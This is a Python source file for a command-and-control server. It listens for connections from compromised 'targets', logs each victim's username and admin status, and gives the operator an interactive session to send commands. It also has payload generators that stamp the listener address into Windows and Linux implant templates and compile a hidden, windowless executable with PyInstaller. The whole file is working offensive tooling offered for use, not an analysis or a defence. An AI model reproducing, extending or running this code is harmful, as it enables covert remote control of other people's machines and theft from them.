import os
import shutil
import socket
import sys
import threading
from prettytable import PrettyTable
import time
from datetime import datetime
import random
import string
import subprocess




def winplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()


def linplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}/linplant.py'):
        print(f'{check_cwd}')
        shutil.copy('linplant.py', file_name)
    else:
        print(f'[-] {check_cwd} \\ linplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

def exeplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    exe_file = f'{random_name}.exe'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occured during generation')
    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}...')
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
    os.remove(f'{random_name}.spec')
    shutil.rmtree('build')
    if os.path.exists(f'{check_cwd}\\{exe_file}'):
        print(f'[+] {exe_file} saved to current directory.')
    else:
        print('[-] Some error occured during generation.')

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=communication_handler)
    t1.start()

def target_comm_channel(target_id):
    while True:
        message = input('send message#> ')
        communication_out(target_id, message)
        if message == 'exit':
            target_id.close()
            break
        elif message == 'background':
            break
        else:
            response = communication_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                target_id.close()
                break

            print(response)

def communication_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            if admin == 1:
                admin_value = 'Yes'
            elif username == 'root':
                admin_value = 'Yes'
            else:
                admin_value = 'No'
            current_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {current_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record, username, admin_value])
                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass


def communication_in(target_id):
    print('[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    return response


def communication_out(target_id, message):
    message = str(message)
    target_id.send(message.encode())


def banner():
    print('                                                                                                                                                           _..._                   ')
    print('                                 _______                                                         _______                                                .-\'_..._\'\'.     .-\'\'-.     ')
    print('             .                   \  ___ `\'.                                /|                .--.\  ___ `\'.                 __.....__                 .\' .\'      \'.\  .\' .-.  )    ')
    print('           .\'|                    \' |--.\  \                        _     _||                |__| \' |--.\  \    .--./)  .-\'\'         \'.              / .\'            / .\'  / /     ')
    print('          <  |                    | |    \  \'     .-\'\'` \'\'-.  /\    \\\\   //||        .-,.--. .--. | |    \  \'  /.\'\'\\\\  /     .-\'\'"\'-.  `.           . \'             (_/   / /      ')
    print('           | |             __     | |     |  \'  .\'          \'.`\\\\  //\\\\ // ||  __    |  .-. ||  | | |     |  \'| |  | |/     /________\   \          | |                  / /       ')
    print('       _   | | .\'\'\'-.   .:--.\'.   | |     |  | /              ` \`//  \\\'/  ||/\'__ \'. | |  | ||  | | |     |  | \`-\' / |                  |          | |                 / /        ')
    print('     .\' |  | |/.\'\'\'. \ / |   \ |  | |     \' .\'\'                \' \|   |/   |:/`  \'. \'| |  | ||  | | |     \' .\' /("\'`  \    .-------------\'          . \'                . \'         ')
    print('    .   | /|  /    | | `" __ | |  | |___.\' /\' |         .-.    |  \'        ||     | || |  \'- |  | | |___.\' /\'  \ \'---. \    \'-.____...---.           \ \'.          .  / /    _.-\') ')
    print('  .\'.\'| |//| |     | |  .\'.\'\'| | /_______.\'/  .        |   |   .           ||\    / \'| |     |__|/_______.\'/    /\'""\'.\ `.             .\'             \'. `._____.-\'/.\' \'  _.\'.-\'\'  ')
    print('.\'.\'.-\'  / | |     | | / /   | |_\_______|/    .       \'._.\'  /            |/\\\'..\' / | |         \\_______|/    ||     ||  `\'\'-...... -\'                 `-.______ //  /.-\'_.\'      ')
    print('.\'   \_.\'  | \'.    | \'.\ \._,\ \'/               \'._         .\'             \'  `\'-\'`  |_|                       \\\'. __//                                          `/    _.\'         ')
    print('           \'---\'   \'---\'`--\'  `"                   \'-....-\'`                                                    `\'---\'                                           ( _.-\'            ')


if __name__ == '__main__':
    banner()
    targets = []
    listener_counter = 0
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            command = input('Enter command#> ')
            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP address to listen on: ')
                host_port = input('[+] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1
            if command == 'winplant py':
                if listener_counter > 0:
                    winplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'linplant py':
                if listener_counter > 0:
                    linplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'exeplant':
                if listener_counter > 0:
                    exeplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    target_id = (targets[num])[0]
                    target_comm_channel(target_id)
        except KeyboardInterrupt:
            print('\n[+] Keyboard interrupt issued.')
            kill_flag = 1
            sock.close()
            break